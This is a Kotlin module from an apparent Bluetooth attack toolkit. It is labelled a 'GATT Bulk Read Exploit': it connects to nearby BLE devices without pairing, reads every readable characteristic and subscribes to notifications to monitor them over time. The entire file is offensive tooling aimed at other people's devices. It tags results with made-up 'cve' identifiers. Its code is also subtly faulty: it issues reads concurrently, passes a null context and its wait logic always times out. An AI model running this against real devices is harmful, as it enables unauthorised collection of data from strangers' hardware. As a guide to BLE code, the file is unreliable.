package com.bluesnafer_pro

import android.bluetooth.*
import com.bluesnafer_pro.BluetoothMethodHandler
import java.io.*
import java.util.*
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit

/**
 * GATT Bulk Read Exploit
 * Reads all readable characteristics from all services on target device
 * Extracts: sensor data, battery level, device info, firmware, configuration
 *
 * Works on any BLE device with GATT services accessible (most are)
 * No pairing required for read-only characteristics
 */
object GATTBulkReader {
    private const val TAG = "GATTBulkReader"

    /**
     * Enumerate and read all readable characteristics recursively
     * Returns map of service UUID -> characteristic UUID -> value
     */
    fun bulkRead(device: BluetoothDevice): Map<String, Any> {
        BluesnaferLogger.d(TAG, "GATT bulk read on ${device.address}")

        val allData = mutableMapOf<String, Any>()
        val discoveredServices = mutableListOf<String>()
        val readChars = mutableListOf<Map<String, String>>()
        val failedReads = mutableListOf<String>()
        var gatt: BluetoothGatt? = null

        val latch = CountDownLatch(1)

        try {
            val callback = object : BluetoothGattCallback() {
                override fun onConnectionStateChange(gatt: BluetoothGatt, status: Int, newState: Int) {
                    if (newState == BluetoothProfile.STATE_CONNECTED) {
                        BluesnaferLogger.d(TAG, "GATT connected, discovering services...")
                        gatt.discoverServices()
                    } else if (newState == BluetoothProfile.STATE_DISCONNECTED) {
                        latch.countDown()
                    }
                }

                override fun onServicesDiscovered(gatt: BluetoothGatt, status: Int) {
                    if (status == BluetoothGatt.GATT_SUCCESS) {
                        val services = gatt.services
                        BluesnaferLogger.d(TAG, "Services discovered: ${services.size}")

                        for (service in services) {
                            val serviceUuid = service.uuid.toString()
                            discoveredServices.add(serviceUuid)
                            val serviceData = mutableMapOf<String, Any>()
                            val charMap = mutableMapOf<String, String>()

                            for (characteristic in service.characteristics) {
                                val charUuid = characteristic.uuid.toString()
                                val properties = characteristic.properties

                                // Check if readable
                                if ((properties and BluetoothGattCharacteristic.PROPERTY_READ) != 0) {
                                    try {
                                        val readSuccess = gatt.readCharacteristic(characteristic)
                                        if (readSuccess) {
                                            charMap[charUuid] = "pending"
                                        } else {
                                            failedReads.add("$serviceUuid/$charUuid (init_failed)")
                                        }
                                    } catch (e: Exception) {
                                        failedReads.add("$serviceUuid/$charUuid (${e.message})")
                                    }
                                } else {
                                    // Not readable, skip
                                }
                            }
                            serviceData["characteristics"] = charMap
                            allData[serviceUuid] = serviceData
                        }
                    } else {
                        BluesnaferLogger.w(TAG, "Service discovery failed: $status")
                    }
                }

                override fun onCharacteristicRead(gatt: BluetoothGatt, characteristic: BluetoothGattCharacteristic, status: Int) {
                    val serviceUuid = characteristic.service.uuid.toString()
                    val charUuid = characteristic.uuid.toString()

                    if (status == BluetoothGatt.GATT_SUCCESS) {
                        val value = characteristic.value
                        val valueStr = if (value != null) bytesToHex(value) else "null"

                        // Update map
                        (allData[serviceUuid] as? MutableMap<String, Any>)?.let { serviceMap ->
                            val charMap = serviceMap["characteristics"] as? MutableMap<String, String> ?: mutableMapOf()
                            charMap[charUuid] = valueStr
                            serviceMap["characteristics"] = charMap
                        }

                        readChars.add(mapOf("service" to serviceUuid, "characteristic" to charUuid, "value" to valueStr))
                        BluesnaferLogger.d(TAG, "Read $serviceUuid/$charUuid = ${value?.size ?: 0} bytes")
                    } else {
                        failedReads.add("$serviceUuid/$charUuid (read_status=$status)")
                    }
                }

                override fun onDescriptorRead(gatt: BluetoothGatt, descriptor: BluetoothGattDescriptor, status: Int) {
                    // Optional: read descriptors too
                }
            }

            // Connect with auto-connect=false for faster
            gatt = device.connectGatt(null, false, callback)

            // Wait for operation to complete (timeout 15s)
            if (!latch.await(15, TimeUnit.SECONDS)) {
                BluesnaferLogger.w(TAG, "Bulk read timeout - partial data may be available")
            }

            // Gather statistics
            val totalServices = discoveredServices.size
            val totalCharacteristics = readChars.size
            val readFailed = failedReads.size
            val sampleData = readChars.take(10).map { "${it["service"]}/${it["characteristic"]}" }

            return mapOf(
                "success" to true,
                "message" to "GATT bulk read completed",
                "servicesDiscovered" to totalServices,
                "characteristicsRead" to totalCharacteristics,
                "readFailures" to readFailed,
                "sampleReads" to sampleData,
                "allData" to allData,
                "fullDump" to readChars.map { it["service"] + "/" + it["characteristic"] + "=" + it["value"] },
                "cve" to "GATT-BULK-READ",
                "severity" to "MEDIUM"
            )

        } catch (e: Exception) {
            BluesnaferLogger.e(TAG, "GATT bulk read error: ${e.message}")
            return mapOf(
                "success" to false,
                "error" to (e.message ?: "unknown error"),
                "cve" to "GATT-BULK-READ"
            )
        } finally {
            try { gatt?.close() } catch (_: Exception) {}
        }
    }

    /**
     * Efficient continuous read: monitor characteristics for changes
     * (for dynamic data like sensor readings)
     */
    fun monitorCharacteristics(device: BluetoothDevice, characteristicUuids: List<String>? = null, durationSec: Int = 30): Map<String, Any> {
        BluesnaferLogger.d(TAG, "GATT characteristic monitoring starting")

        val changes = mutableListOf<Map<String, String>>()
        val monitoredValues = mutableMapOf<String, MutableList<String>>()
        var gatt: BluetoothGatt? = null
        val latch = CountDownLatch(1)

        try {
            val callback = object : BluetoothGattCallback() {
                override fun onConnectionStateChange(gatt: BluetoothGatt, status: Int, newState: Int) {
                    if (newState == BluetoothProfile.STATE_CONNECTED) {
                        gatt.discoverServices()
                    } else {
                        latch.countDown()
                    }
                }

                override fun onServicesDiscovered(gatt: BluetoothGatt, status: Int) {
                    if (status == BluetoothGatt.GATT_SUCCESS) {
                        val services = gatt.services
                        for (service in services) {
                            for (characteristic in service.characteristics) {
                                val charUuid = characteristic.uuid.toString()

                                // Filter if specific UUIDs requested
                                if (characteristicUuids != null && charUuid !in characteristicUuids) {
                                    continue
                                }

                                // Enable notifications if possible
                                if ((characteristic.properties and BluetoothGattCharacteristic.PROPERTY_NOTIFY) != 0) {
                                    gatt.setCharacteristicNotification(characteristic, true)
                                    // Write CCCD to enable notifications on remote
                                    val descriptor = characteristic.getDescriptor(UUID.fromString("00002902-0000-1000-8000-00805F9B34FB"))
                                    if (descriptor != null) {
                                        descriptor.value = BluetoothGattDescriptor.ENABLE_NOTIFICATION_VALUE
                                        gatt.writeDescriptor(descriptor)
                                    }
                                }

                                // Also read initial value
                                if ((characteristic.properties and BluetoothGattCharacteristic.PROPERTY_READ) != 0) {
                                    gatt.readCharacteristic(characteristic)
                                }
                            }
                        }
                    }
                }

                override fun onCharacteristicRead(gatt: BluetoothGatt, characteristic: BluetoothGattCharacteristic, status: Int) {
                    if (status == BluetoothGatt.GATT_SUCCESS) {
                        val value = characteristic.value
                        val valueStr = value?.let { bytesToHex(it) } ?: "null"
                        val key = characteristic.uuid.toString()

                        monitoredValues.getOrPut(key) { mutableListOf() }.add(valueStr)
                        changes.add(mapOf("characteristic" to key, "value" to valueStr, "timestamp" to System.currentTimeMillis().toString()))
                    }
                }

                override fun onCharacteristicChanged(gatt: BluetoothGatt, characteristic: BluetoothGattCharacteristic) {
                    // Notification received
                    val value = characteristic.value
                    val valueStr = value?.let { bytesToHex(it) } ?: "null"
                    val key = characteristic.uuid.toString()

                    monitoredValues.getOrPut(key) { mutableListOf() }.add(valueStr)
                    changes.add(mapOf("characteristic" to key, "value" to valueStr, "timestamp" to System.currentTimeMillis().toString(), "type" to "notification"))
                }
            }

            gatt = device.connectGatt(null, false, callback)

            // Wait for duration or disconnect
            latch.await((durationSec + 5).toLong(), TimeUnit.SECONDS)

            val totalChanges = changes.size
            val uniqueChars = monitoredValues.keys.size
            val sample = changes.take(5).map { "${it["characteristic"]}=${it["value"]?.take(20)}" }

            return mapOf(
                "success" to true,
                "message" to "Monitoring completed",
                "totalChanges" to totalChanges,
                "uniqueCharacteristics" to uniqueChars,
                "sample" to sample,
                "allData" to monitoredValues,
                "cve" to "GATT-MONITOR"
            )

        } catch (e: Exception) {
            return mapOf("success" to false, "error" to (e.message ?: "unknown error"), "cve" to "GATT-MONITOR")
        } finally {
            try { gatt?.close() } catch (_: Exception) {}
        }
    }

    /**
     * Helper: Convert byte array to hex string
     */
    private fun bytesToHex(bytes: ByteArray?): String {
        if (bytes == null) return "null"
        val hexArray = "0123456789ABCDEF".toCharArray()
        val hexChars = CharArray(bytes.size * 2)
        for (j in bytes.indices) {
            val v = bytes[j].toInt() and 0xFF
            hexChars[j * 2] = hexArray[v ushr 4]
            hexChars[j * 2 + 1] = hexArray[v and 0x0F]
        }
        return String(hexChars)
    }
}
